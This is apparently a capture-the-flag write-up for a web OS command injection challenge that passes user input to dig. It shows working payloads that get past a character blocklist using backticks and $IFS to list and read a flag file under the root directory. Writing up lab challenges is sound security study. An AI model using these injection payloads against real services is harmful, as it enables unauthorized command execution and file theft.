## chall oscommand

Author: 53buahapel

Flag folder is in / directory. Find a way to get it.

restricted: [';', '&', '|', '||', '&&', '>', '<', '(', ')', '{', '}', '[', ']', '\', ''', '"', '!', '*', '?', '~', '#', '%', '+', ' ']

Connect: http://172.188.90.64:6779


## solution 
first thing first this is a web challange with os command injection vulnerablity. The challange service is just execute bash command like `dig (myinput)` and render the output back in html response.

example : 

input : `google.com`

output : 

```  
; <<>> DiG 9.16.33-Debian <<>> google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25488
;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 4, ADDITIONAL: 0

;; QUESTION SECTION:
;google.com.			IN	A
  
```


1. To retrieve information about the flag, we utilized a backtick and the $IFS variable trick to circumvent restrictions. The flag is located within a directory named 'sup3rsecr3td1rectory' in the root folder. By executing the command `` `ls$IFS../sup3rsecr3td1rectory/` ``, the flag filename is flag2.txt.
2. First try (fail) using cat (dont know why) `` `cat$IFS../sup3rsecr3td1rectory/flag2.txt` ``.
3. Messing around with du command to get information about how many bytes in flag2.txt. `` `du$IFS-b$IFS../sup3rsecr3td1rectory/flag2.txt` `` . The output is 72 bytes with \n.
4. Using head to get the first 60 characters of the flag2.txt. `` `head$IFS-c60$IFS../sup3rsecr3td1rectory/flag2.txt` `` . Output : TCP1P{007150786cd8158d85d4d9445115857a82adc67310b8f78a011b95
5. Using cut command to get the last 12 chars of the flag2.txt. `` `cut$IFS-c61-72$IFS../sup3rsecr3td1rectory/flag2.txt` ``. Output : 57dd540593} 

Intended solution : `` localhost$IFS`cat$IFS../sup3rsecr3td1rectory/flag2.txt` ``

references [hacktrick](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) [backtick explanation](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands)


